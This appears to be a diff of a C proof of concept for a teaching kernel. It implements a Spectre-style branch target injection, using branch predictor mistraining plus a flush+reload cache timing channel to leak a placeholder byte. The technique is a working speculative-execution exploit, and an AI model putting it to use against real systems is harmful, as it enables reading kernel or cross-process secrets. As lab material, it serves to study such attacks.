@@ -1,5 +1,4 @@
 #include <stdio.h>
-
 #include "types.h"
 #include "user.h"
 
@@ -14,6 +13,11 @@
 #define PAGE_SIZE (1ull << PAGE_BITS)
 #define PAGE_INDEX_MASK ~((1ull << PAGE_BITS) - 1)
 
+#define CACHE_HIT_THRESHOLD 80
+#define GAP 1024
+
+u8 *channel;
+
 // mimic the safe target
 __attribute__((noinline))
 int
@@ -25,18 +29,26 @@ dummy_gadget(void)
 // mimic the victim
 __attribute__((noinline))
 int
-dummy_victim(u64 dest)
+dummy_victim(u8 *channel, u64 dest, int input)
 {
+  int junk = 0;
+  // set up bhb by performing >29 taken branches
+  for (int i = 1; i <= 100; i++) {
+    input += i;
+    junk += input & i;
+  }
+
+  // use 10 nops to get the offsets between user and kernel to match
   int result;
-  __asm volatile("callq *%1\n"
+  __asm volatile("nop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\n"
+                 "callq *%1\n"
                  "mov %%eax, %0\n"
                  : "=r" (result)
                  : "r" (dest));
-  result++;
-  return result;
+  return result & junk & ((u64)channel);
 }
 
-void *
+void*
 mmap_two_pages(u64 addr)
 {
   return mmap((void*) (addr & PAGE_INDEX_MASK),
@@ -49,12 +61,9 @@ mmap_two_pages(u64 addr)
 int
 main(int argc, char *argv[])
 {
-  printf("starting\n");
-  u64 dest_addr = get_dest_addr(); // need to flush this from cache
   u64 kva = get_victim_addr(); // need to mistrain this call
   u64 kga = get_gadget_addr(); // to predict here
-  int result = victim();
-  printf("dest_addr: 0x%lx, kva: 0x%lx, kga: 0x%lx, result: %d\n", dest_addr, kva, kga, result);
+  printf("kva: 0x%lx, kga: 0x%lx\n", kva, kga);
 
   int kvoffset = get_victim_offset(); // offset to call instruction
   printf("kvoffset: %d\n", kvoffset);
@@ -63,6 +72,11 @@ main(int argc, char *argv[])
   u8 *code = (u8*) &dummy_victim;
   for (uvoffset = 0; *(code + uvoffset) != 0xff; uvoffset++);
   printf("uvoffset: %d\n", uvoffset);
+
+  if (kvoffset != uvoffset) {
+    printf("kernel and user offsets don't match\n");
+    return 1;
+  }
 
   u64 uva = (kva & USER_MASK) + kvoffset - uvoffset;
   printf("uva: 0x%lx\n", uva);
@@ -86,70 +100,90 @@ main(int argc, char *argv[])
   // 8 so that we don't overwrite uva
   memcpy((void*) uga, (void*) &dummy_gadget, 8);
 
-  auto uv = ((int (*)(u64)) uva);
-
-  result = uv(uga);
-  printf("result: %d\n", result);
+  auto uv = ((int (*)(u8*, u64, int)) uva);
 
   // see appendix C of https://spectreattack.com/spectre.pdf
-  const int GAP = 512;
-  u8 *channel = (u8*) malloc(256 * GAP * sizeof(u8));
+  channel = (u8*) malloc(256 * GAP * sizeof(u8));
   int hits[256]; // record cache hits
-  int trials, i, j, k, mix_i, junk = 0;
+  int tries, i, j, k, mix_i, junk = 0;
   u64 start, elapsed;
   volatile u8 *addr;
 
   for (i = 0; i < 256; i++) {
     hits[i] = 0;
-    channel[i * GAP] = 5;
+    channel[i * GAP] = i;
   }
 
-  for (trials = 1; trials > 0; trials--) {
+  for (tries = 999; tries > 0; tries--) {
+
     // flush side channel
     for (i = 0; i < 256; i++)
       clflush(&channel[i * GAP]);
 
     // flush actual target
-    // flush_target();
+    flush_target();
 
     mfence();
 
     // poison branch predictor
-    /*
-    for (j = 5; j > 0; j--) {
-      junk ^= uv(uga);
+    for (j = 100; j > 0; j--) {
+      junk ^= uv(channel, (u64) &dummy_gadget, 0);
     }
 
-    // set up registers
+    mfence();
 
-    // call victim
-    junk ^= victim();
+    u8 secret = 42;
+    // set up registers
+    // victim speculatively executes gadget
+    // gadget will read from address at (%rdi, 512 * (%rsi), 1)
+    /*
+    __asm volatile("mov %0, %%rdi\n"
+                   "mov %1, %%rsi\n"
+                   :: "r" (channel), "r" (&secret)
+                   : "%rdi", "%rsi");
     */
 
-    for (j = 5; j > 0; j--) {
-      junk ^= channel[102 * GAP];
-      mfence();
-    }
+    // call victim
+    junk ^= victim(channel, &secret, 0);
 
-    u64 e[256];
+    //junk ^= channel[250 * GAP];
+    //gadget(channel, &secret);
+
+    mfence();
+
     // time reads, mix up order to prevent stride prediction
     for (i = 0; i < 256; i++) {
       mix_i = ((i * 167) + 13) & 255;
       addr = &channel[mix_i * GAP];
       start = rdtsc();
       junk ^= *addr;
-      mfence();
+      mfence(); // make sure read completes before we check the timer
       elapsed = rdtsc() - start;
-      // printf("mix_i: %d, elapsed: %lu\n", mix_i, elapsed);
-      e[mix_i] = elapsed;
-    }
-
-    for (i = 0; i < 256; i++) {
-      printf("i: %d, elapsed: %lu\n", i, e[i]);
+      if (elapsed <= CACHE_HIT_THRESHOLD)
+        hits[mix_i]++;
     }
   }
 
-  printf("junk: %d\n", junk);
+  // locate top two results
+  j = k = -1;
+  for (i = 0; i < 256; i++) {
+    // printf("i: %d, hits: %d\n", i, hits[i]);
+
+    if (j < 0 || hits[i] >= hits[j]) {
+      k = j;
+      j = i;
+    } else if (k < 0 || hits[i] >= hits[k]) {
+      k = i;
+    }
+  }
+  if ((hits[j] >= 2 * hits[k] + 5) ||
+      (hits[j] == 2 && hits[k] == 0)) {
+    printf("hit: %d\n", j);
+  } else {
+    printf("no hit\n");
+  }
+
+  printf("junk: %d\n", junk); // prevent junk from being optimized out
 
   return 0;
 }
